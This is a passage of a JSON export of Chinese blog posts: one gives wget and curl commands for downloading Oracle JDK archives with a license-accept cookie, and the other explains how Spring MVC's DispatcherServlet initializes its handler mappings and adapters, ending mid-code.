class=\"hljs-preprocessor\">.rpm</span></code></pre>\n\n<p>TAR GZ:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">wget -c --header <span class=\"hljs-string\">\"Cookie: oraclelicense=accept-securebackup-cookie\"</span> http://download<span class=\"hljs-preprocessor\">.oracle</span><span class=\"hljs-preprocessor\">.com</span>/otn-pub/java/jdk/<span class=\"hljs-number\">8</span>u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-<span class=\"hljs-number\">8</span>u131-linux-x64<span class=\"hljs-preprocessor\">.tar</span><span class=\"hljs-preprocessor\">.gz</span></code></pre>\n\n<p>RPM using curl:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">curl <span class=\"hljs-attribute\">-v</span> <span class=\"hljs-attribute\">-j</span> <span class=\"hljs-attribute\">-k</span> <span class=\"hljs-attribute\">-L</span> <span class=\"hljs-attribute\">-H</span> <span class=\"hljs-string\">\"Cookie: oraclelicense=accept-securebackup-cookie\"</span> http:<span class=\"hljs-comment\">//download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.rpm &gt; jdk-8u112-linux-x64.rpm</span></code></pre>\n\n<p>UPDATE FOR JDK 7u79 <br>\nTAR GZ:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">wget <span class=\"hljs-subst\">--</span>no<span class=\"hljs-attribute\">-check</span><span class=\"hljs-attribute\">-certificate</span> <span class=\"hljs-subst\">--</span>no<span class=\"hljs-attribute\">-cookies</span> <span class=\"hljs-subst\">--</span><span class=\"hljs-keyword\">header</span> <span class=\"hljs-string\">\"Cookie: oraclelicense=accept-securebackup-cookie\"</span> http:<span class=\"hljs-comment\">//download.oracle.com/otn-pub/java/jdk/7u79-b15/jdk-7u79-linux-x64.tar.gz</span></code></pre>\n\n<p>RPM using curl:</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">curl <span class=\"hljs-attribute\">-v</span> <span class=\"hljs-attribute\">-j</span> <span class=\"hljs-attribute\">-k</span> <span class=\"hljs-attribute\">-L</span> <span class=\"hljs-attribute\">-H</span> <span class=\"hljs-string\">\"Cookie: oraclelicense=accept-securebackup-cookie\"</span> http:<span class=\"hljs-comment\">//download.oracle.com/otn-pub/java/jdk/7u79-b15/jdk-7u79-linux-x64.rpm &gt; jdk-7u79-linux-x64.rpm</span></code></pre>",
			"markdowncontent":"最近在服务器上安装jdk遇到一个问题，oracle官网下载jdk都需要同意它的license才能下载，所有直接使用`wget xxx`会下载到它的html文件，并不能下载真实文件。\n\n\n**解决办法**：\n\nUPDATED FOR JDK 9 it looks like you can download it now directly from java.net without sending a header\n```\nwget http://download.java.net/java/GA/jdk9/9/binaries/jdk-9+181_linux-x64_bin.tar.gz\n```\nUPDATED FOR JDK 8u151\nTAR GZ:\n```\nwget --no-check-certificate -c --header \"Cookie: oraclelicense=accept-securebackup-cookie\" http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.tar.gz\n```\nUPDATED FOR JDK 8u151\nTAR GZ:\n```\nwget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.tar.gz\"\nRPM:\n\nwget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http://download.oracle.com/otn-pub/java/jdk/8u151-b12/e758a0de34e24606bca991d704f6dcbf/jdk-8u151-linux-x64.rpm\"\n```\n\nUPDATED FOR JDK 8u131\nRPM:\n```\n  wget -c --header \"Cookie: oraclelicense=accept-securebackup-cookie\" http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.rpm\n```\nTAR GZ:\n```\nwget -c --header \"Cookie: oraclelicense=accept-securebackup-cookie\" http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.tar.gz\n```\nRPM using curl:\n\n``` \ncurl -v -j -k -L -H \"Cookie: oraclelicense=accept-securebackup-cookie\" http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.rpm > jdk-8u112-linux-x64.rpm\n```\n\nUPDATE FOR JDK 7u79\nTAR GZ:\n```\nwget --no-check-certificate --no-cookies --header \"Cookie: oraclelicense=accept-securebackup-cookie\" http://download.oracle.com/otn-pub/java/jdk/7u79-b15/jdk-7u79-linux-x64.tar.gz\n```\nRPM using curl:\n```\ncurl -v -j -k -L -H \"Cookie: oraclelicense=accept-securebackup-cookie\" http://download.oracle.com/otn-pub/java/jdk/7u79-b15/jdk-7u79-linux-x64.rpm > jdk-7u79-linux-x64.rpm\n```\n",
			"tags":"",
			"id":"78617739",
			"categories":"java,ubuntu,linux",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年10月01日 07:40:59",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"引言一直以来都在使用Spring mvc，能够熟练使用它的各种组件。但是，它一直像个黑盒一样，我并不知道它内部是如何工作的，这几天一直在研究它的源码，今天已经把它的工作原理弄清了，因此把我的这个研究过程记录下来。现在让我们进入源码的世界，来看看这个黑盒中到底有什么神奇的东西。spring MVC 总览学一门新的知识，首先要大致了解它的全貌，然后在深入自己感兴趣的细节。 \n 那么在这一小节中，我不会去",
			"title":"Spring MVC源码剖析",
			"type":"original",
			"content":"<h2 id=\"引言\">引言</h2>\n\n<p>一直以来都在使用Spring mvc，能够熟练使用它的各种组件。但是，它一直像个黑盒一样，我并不知道它内部是如何工作的，这几天一直在研究它的源码，今天已经把它的工作原理弄清了，因此把我的这个研究过程记录下来。现在让我们进入源码的世界，来看看这个黑盒中到底有什么神奇的东西。</p>\n\n\n\n<h2 id=\"spring-mvc-总览\">spring MVC 总览</h2>\n\n<p><strong>学一门新的知识，首先要大致了解它的全貌，然后在深入自己感兴趣的细节。</strong> <br>\n 那么在这一小节中，我不会去深入具体的细节了解spring MVC，而是去了解它大致的流程，它是如何工作起来的。首先，让我们先看看下面这张流程图。 <br>\n<img src=\"http://upload-images.jianshu.io/upload_images/1489067-e0a90438b9d915f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"spring MVC 流程图\" title=\"\"> <br>\n图片来源：我从<a href=\"https://images.google.com/\" target=\"_blank\">Google Image</a>。</p>\n\n<p>在接下来的文章中我会去深入源码来解释上图中的各个过程，现在大家对这张图有个概念就行。相信用过spring MVC的人都知道，客户端的请求要通过前端控制器(DispatcherServlet)，然后前端控制器去找到请求相应的<code>Controller</code>. 因此我们可以猜到前端控制器一定要在<code>Servlet</code>容器启动时被实例化，所以我们需要把<code>DispatcherServlet</code>配置到<code>web.xml</code>文件中，部分配置如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">servlet</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">servlet-name</span>&gt;</span>spring<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">servlet-name</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">servlet-class</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">init-param</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">param-name</span>&gt;</span>contextConfigLocation<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">param-name</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">param-value</span>&gt;</span>classpath:spring.xml<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">param-value</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">init-param</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">load-on-startup</span>&gt;</span>1<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">load-on-startup</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">servlet</span>&gt;</span></code></pre>\n\n<p>如果你是Spring Team的一员，在实例化对象的时候，你会做些什么，大家好好想一想？Spring Team 一定会把一些后续要用到的东西进行初始化。接下来，让我们进入源码的世界吧，一层层揭开Spring MVC的面纱。</p>\n\n\n\n<h2 id=\"dispatcherservlet的实例化之旅\">DispatcherServlet的实例化之旅</h2>\n\n<p>DispatcherServlet的实例化之旅在这一小节中，我会通过查看Spring MVC的源码来看看在DispatcherServlet实例化的过程中，Spring到底初始化了一些什么的东西。 <br>\n* DispatcherServlet中的静态代码块</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-javadoc\">/**\n* Name of the class path resource (relative to the DispatcherServlet class)\n* that defines DispatcherServlet's default strategy names.\n*/</span>\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> String DEFAULT_STRATEGIES_PATH = <span class=\"hljs-string\">\"DispatcherServlet.properties\"</span>;\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> Properties defaultStrategies;\n<span class=\"hljs-keyword\">static</span> {\n<span class=\"hljs-comment\">// Load default strategy implementations from properties file.</span>\n<span class=\"hljs-comment\">// This is currently strictly internal and not meant to be customized</span>\n<span class=\"hljs-comment\">// by application developers.</span>\n<span class=\"hljs-keyword\">try</span> {\nClassPathResource resource = <span class=\"hljs-keyword\">new</span> ClassPathResource(DEFAULT_STRATEGIES_PATH, DispatcherServlet.class);\ndefaultStrategies = PropertiesLoaderUtils.loadProperties(resource);\n}\n<span class=\"hljs-keyword\">catch</span> (IOException ex) {\n<span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> IllegalStateException(<span class=\"hljs-string\">\"Could not load 'DispatcherServlet.properties': \"</span> + ex.getMessage());\n}\n}</code></pre>\n\n<p>当一个类被JVM加载、链接过后，JVM会调用类构造器会初始化一些静态域对象。因此上面的静态代码块会被执行，其中的代码只有一个目的，那就是从属性文件中加载默认的strategy实现，最后赋值给<code>defaultStrategies</code>变量。查看spring-webmvc jar包内部的结构。结果如下图：</p>\n\n<p><img src=\"http://upload-images.jianshu.io/upload_images/1489067-18d778170c9b27da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"image.png\" title=\"\"> <br>\n大家可以打开DispatcherServlet.properties文件，可以看到如下内容：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-properties hljs avrasm\"><span class=\"hljs-preprocessor\"># Default implementation classes for DispatcherServlet's strategy interfaces.</span>\n<span class=\"hljs-preprocessor\"># Used as fallback when no matching beans are found in the DispatcherServlet context.</span>\n<span class=\"hljs-preprocessor\"># Not meant to be customized by application developers.</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.LocaleResolver</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.i</span>18n<span class=\"hljs-preprocessor\">.AcceptHeaderLocaleResolver</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.ThemeResolver</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.theme</span><span class=\"hljs-preprocessor\">.FixedThemeResolver</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.HandlerMapping</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.handler</span><span class=\"hljs-preprocessor\">.BeanNameUrlHandlerMapping</span>,\\\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.mvc</span><span class=\"hljs-preprocessor\">.annotation</span><span class=\"hljs-preprocessor\">.DefaultAnnotationHandlerMapping</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.HandlerAdapter</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.mvc</span><span class=\"hljs-preprocessor\">.HttpRequestHandlerAdapter</span>,\\\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.mvc</span><span class=\"hljs-preprocessor\">.SimpleControllerHandlerAdapter</span>,\\\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.mvc</span><span class=\"hljs-preprocessor\">.annotation</span><span class=\"hljs-preprocessor\">.AnnotationMethodHandlerAdapter</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.HandlerExceptionResolver</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.mvc</span><span class=\"hljs-preprocessor\">.annotation</span><span class=\"hljs-preprocessor\">.AnnotationMethodHandlerExceptionResolver</span>,\\\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.mvc</span><span class=\"hljs-preprocessor\">.annotation</span><span class=\"hljs-preprocessor\">.ResponseStatusExceptionResolver</span>,\\\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.mvc</span><span class=\"hljs-preprocessor\">.support</span><span class=\"hljs-preprocessor\">.DefaultHandlerExceptionResolver</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.RequestToViewNameTranslator</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.view</span><span class=\"hljs-preprocessor\">.DefaultRequestToViewNameTranslator</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.ViewResolver</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.view</span><span class=\"hljs-preprocessor\">.InternalResourceViewResolver</span>\n\norg<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.FlashMapManager</span>=org<span class=\"hljs-preprocessor\">.springframework</span><span class=\"hljs-preprocessor\">.web</span><span class=\"hljs-preprocessor\">.servlet</span><span class=\"hljs-preprocessor\">.support</span><span class=\"hljs-preprocessor\">.SessionFlashMapManager</span></code></pre>\n\n<p>相信大家一定熟悉里面的一些类吧，别着急，下面会用到这些东西，大家现在有个印象就行。在context成功的refresh过后，<code>onRefresh</code>方法就会被调用，然后它会调用initStrategies方法。下面让我们来看看initStrategies方法具体都初始化哪些strategy对象。</p>\n\n<ul>\n<li>strategy对象的初始化)strategy对象的初始化</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-javadoc\">/**\n* Initialize the strategy objects that this servlet uses.\n* &lt;p&gt;May be overridden in subclasses in order to initialize further strategy objects.\n*/</span>\n<span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">initStrategies</span>(ApplicationContext context) {\ninitMultipartResolver(context);\ninitLocaleResolver(context);\ninitThemeResolver(context);\ninitHandlerMappings(context);\ninitHandlerAdapters(context);\ninitHandlerExceptionResolvers(context);\ninitRequestToViewNameTranslator(context);\ninitViewResolvers(context);\ninitFlashMapManager(context);\n}</code></pre>\n\n<p>对于上面的各个初始化方法，我只讲解几个与我们开发者最密切的初始化方法，它们分别是<code>initHandlerMappings</code>, <code>initHandlerAdapters</code>, <code>initHandlerExceptionResolvers</code>,<code>initViewResolvers</code>。 如果大家对其它方法感兴趣，自己去查看一下相应的源码。下面让我们来深入各个初始化方法的细节。 <br>\n* initHandlerMappings 方法 <br>\n这个方法的作用是初始化我们程序将要用到的HandlerMapping对象，下面让我们来看看源码。源码如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-javadoc\">/** List of HandlerMappings used by this servlet */</span>\n<span class=\"hljs-keyword\">private</span> List&lt;HandlerMapping&gt; handlerMappings;\n\n<span class=\"hljs-javadoc\">/** Detect all HandlerMappings or just expect \"handlerMapping\" bean? */</span>\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">boolean</span> detectAllHandlerMappings = <span class=\"hljs-keyword\">true</span>;\n\n<span class=\"hljs-javadoc\">/**\n* Initialize the HandlerMappings used by this class.\n* &lt;p&gt;If no HandlerMapping beans are defined in the BeanFactory for this namespace,\n* we default to BeanNameUrlHandlerMapping.\n*/</span>\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">initHandlerMappings</span>(ApplicationContext context) {\n<span class=\"hljs-keyword\">this</span>.handlerMappings = <span class=\"hljs-keyword\">null</span>;\n\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.detectAllHandlerMappings) {\n<span class=\"hljs-comment\">// Find all HandlerMappings in the ApplicationContext, including ancestor contexts.</span>\nMap&lt;String, HandlerMapping&gt; matchingBeans =\nBeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerMapping.class, <span class=\"hljs-keyword\">true</span>, <span class=\"hljs-keyword\">false</span>);\n<span class=\"hljs-keyword\">if</span> (!matchingBeans.isEmpty()) {\n<span class=\"hljs-keyword\">this</span>.handlerMappings = <span class=\"hljs-keyword\">new</span> ArrayList&lt;HandlerMapping&gt;(matchingBeans.values());\n<span class=\"hljs-comment\">// We keep HandlerMappings in sorted order.</span>\nOrderComparator.sort(<span class=\"hljs-keyword\">this</span>.handlerMappings);\n}\n}\n<span class=\"hljs-keyword\">else</span> {\n<span class=\"hljs-keyword\">try</span> {\nHandlerMapping hm = context.getBean(HANDLER_MAPPING_BEAN_NAME, HandlerMapping.class);\n<span class=\"hljs-keyword\">this</span>.handlerMappings = Collections.singletonList(hm);\n}\n<span class=\"hljs-keyword\">catch</span> (NoSuchBeanDefinitionException ex) {\n<span class=\"hljs-comment\">// Ignore, we'll add a default HandlerMapping later.</span>\n}\n}\n\n<span class=\"hljs-comment\">// Ensure we have at least one HandlerMapping, by registering</span>\n<span class=\"hljs-comment\">// a default HandlerMapping if no other mappings are found.</span>\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.handlerMappings == <span class=\"hljs-keyword\">null</span>) {\n<span class=\"hljs-keyword\">this</span>.handlerMappings = getDefaultStrategies(context, HandlerMapping.class);\n<span class=\"hljs-keyword\">if</span> (logger.isDebugEnabled()) {\nlogger.debug(<span class=\"hljs-string\">\"No HandlerMappings found in servlet '\"</span> + getServletName() + <span class=\"hljs-string\">\"': using default\"</span>);\n}\n}\n}</code></pre>\n\n<p>在了解上面代码的意义之前，让我们来看看我的spring.xml <br>\n 文件中都配置了什么。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">context:component-scan</span> <span class=\"hljs-attribute\">base-package</span>=<span class=\"hljs-value\">\"me.xurtle\"</span> /&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">bean</span> <span class=\"hljs-attribute\">class</span>=<span class=\"hljs-value\">\"org.springframework.web.servlet.view.InternalResourceViewResolver\"</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">property</span> <span class=\"hljs-attribute\">name</span>=<span class=\"hljs-value\">\"prefix\"</span> <span class=\"hljs-attribute\">value</span>=<span class=\"hljs-value\">\"/\"</span> /&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">property</span> <span class=\"hljs-attribute\">name</span>=<span class=\"hljs-value\">\"suffix\"</span> <span class=\"hljs-attribute\">value</span>=<span class=\"hljs-value\">\".jsp\"</span> /&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">bean</span>&gt;</span></code></pre>\n\n<p>大家可以看到，我没有在spring的配置文件配置任何的HandlerMapping对象。从上面的代码我们可以看出<code>detectAllHandlerMappings</code>默认为true，也就是默认会去检测配置文件中所有的HandlerMapping，接下来是<code>beansOfTypeIncludingAncestors</code>方法，如果你去查看这个方法的源码，你会看到它的第一个参数给定的是<code>ListableBeanFactory</code>接口，对于这个接口的实现类来说，它可以枚举出所有定义的bean实例，而不是仅仅可以通过bean名称去获得定义的bean实例。那<code>beansOfTypeIncludingAncestors</code>具体的做法就是枚举出所有定义的bean，筛选出给定类型或其子类的bean，如果第一个参数是<code>HierarchicalBeanFactory</code>的子类，它也会去查找父类工厂中的HandlerMapping，最后返回一个Map对象。</p>\n\n<p>如果返回的Map对象中存在HandlerMapping对象，那么接下来会把这些对象存入到ArrayList中。同样它也会保持HandlerMapping对象在集合中的顺序，大家可能会觉得奇怪，为什么要保持这些对象的顺序呢？其实很简单，等我下面分析到映射请求的时候，大家就会明白了。</p>\n\n<p>如果一直都没有获得到HandlerMapping对象，那么接下来的<code>getDefaultStrategies</code>方法会给我们生成一些默认的HandlerMapping对象。其实这个方法也很简单，它其实就是用我们给定的strategy对象接口的名字作为key，接着去属性文件中加载对应的值。而这个属性文件就是上面我分析的静态代码块中初始化的那个属性文件。接着它会用StringUtils <br>\n 工具类把拿到的value根据逗号分开存入到String数组中，然后遍历这些名字，根据相应的名字加载相应的类，创建相应的对象。不得不说，这个方法的实现真的很好，它只写这一个方法，就可以加载不同的strategy对象，实现了代码的重用，值得我们学习。</p>\n\n<p>如果你Debug一下程序，你可以看到handlerMappings <br>\n 列表中其实有两个实例，第一个是<code>BeanNameUrlHandlerMapping</code>，第二个是<code>DefaultAnnotationHandlerMapping</code>，就象我前面说的那样，Spring MVC会使用列表中的第一个对象，即<code>BeanNameUrlHandlerMapping</code>的对象，如果通过这个对象并没有找到相应的handler，然后才会使用<code>DefaultAnnotationHandlerMapping</code>的对象。</p>\n\n<p>至此，我们还一个逻辑没有介绍。如果想让initHandlerMappings方法走这个逻辑，我们需要把detectAllHandlerMappings设置为<strong>false</strong>.其实这个很简单，只要在<strong>web.xml</strong>文件中配置一下就行了。部分代码如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">servlet</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">servlet-name</span>&gt;</span>spring<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">servlet-name</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">servlet-class</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">init-param</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">param-name</span>&gt;</span>contextConfigLocation<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">param-name</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">param-value</span>&gt;</span>classpath:spring.xml<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">param-value</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">init-param</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">init-param</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">param-name</span>&gt;</span>detectAllHandlerMappings<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">param-name</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">param-value</span>&gt;</span>false<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">param-value</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">init-param</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">load-on-startup</span>&gt;</span>1<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">load-on-startup</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">servlet</span>&gt;</span></code></pre>\n\n<p>除了上面的代码外，我们还需要在spring.xml <br>\n 文件中定义一个HandlerMapping，部分代码如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">bean</span> <span class=\"hljs-attribute\">name</span>=<span class=\"hljs-value\">\"handlerMapping\"</span> <span class=\"hljs-attribute\">class</span>=<span class=\"hljs-value\">\"org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping\"</span> /&gt;</span></code></pre>\n\n<p>你的bean名称一定为handlerMapping，不可以是其它的值。如果你把这个名称指定为其它的值，Spring框架不能得到这个bean，它依然会给你默认的HandlerMapping对象。</p>\n\n<blockquote>\n  <p><strong>总结：</strong>通过上面源码的分析可以看出，在spring配置文件中明确指定一个bean名称为handlerMapping的做法更有效，因为它不需要去遍历配置文件中所有的bean，所以这个做法会加快initHandlerMappings方法的执行。</p>\n</blockquote>\n\n\n\n<h2 id=\"inithandleradapters-方法\">initHandlerAdapters 方法</h2>\n\n<p>这个方法的作用是初始化我们程序将要用到的HandlerAdapter对象，下面让我们来看看源码。源码如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-javadoc\">/** List of HandlerAdapters used by this servlet */</span>\n<span class=\"hljs-keyword\">private</span> List&lt;HandlerAdapter&gt; handlerAdapters;\n\n<span class=\"hljs-javadoc\">/** Detect all HandlerAdapters or just expect \"handlerAdapter\" bean? */</span>\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">boolean</span> detectAllHandlerAdapters = <span class=\"hljs-keyword\">true</span>;\n\n<span class=\"hljs-javadoc\">/**\n* Initialize the HandlerAdapters used by this class.\n* &lt;p&gt;If no HandlerAdapter beans are defined in the BeanFactory for this namespace,\n* we default to SimpleControllerHandlerAdapter.\n*/</span>\n<span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">initHandlerAdapters</span>(ApplicationContext context) {\n<span class=\"hljs-keyword\">this</span>.handlerAdapters = <span class=\"hljs-keyword\">null</span>;\n\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.detectAllHandlerAdapters) {\n<span class=\"hljs-comment\">// Find all HandlerAdapters in the ApplicationContext, including ancestor contexts.</span>\nMap&lt;String, HandlerAdapter&gt; matchingBeans =\nBeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerAdapter.class, <span class=\"hljs-keyword\">true</span>, <span class=\"hljs-keyword\">false</span>);\n<span class=\"hljs-keyword\">if</span> (!matchingBeans.isEmpty()) {\n<span class=\"hljs-keyword\">this</span>.handlerAdapters = <span class=\"hljs-keyword\">new</span> ArrayList&lt;HandlerAdapter&gt;(matchingBeans.values());\n<span class=\"hljs-comment\">// We keep HandlerAdapters in sorted order.</span>\nOrderComparator.sort(<span class=\"hljs-keyword\">this</span>.handlerAdapters);\n}\n}\n<span class=\"hljs-keyword\">else</span> {\n<span class=\"hljs-keyword\">try</span> {\nHandlerAdapter ha = context.getBean(HANDLER_ADAPTER_BEAN_NAME, HandlerAdapter.class);\n<span class=\"hljs-keyword\">this</span>.handlerAdapters = Collections.singletonList(ha);\n}\n<span class=\"hljs-keyword\">catch</span> (NoSuchBeanDefinitionException ex) {\n<span class=\"hljs-comment\">// Ignore, we'll add a default HandlerAdapter later.</span>\n}\n}\n\n<span class=\"hljs-comment\">// Ensure we have at least some HandlerAdapters, by registering</span>\n<span 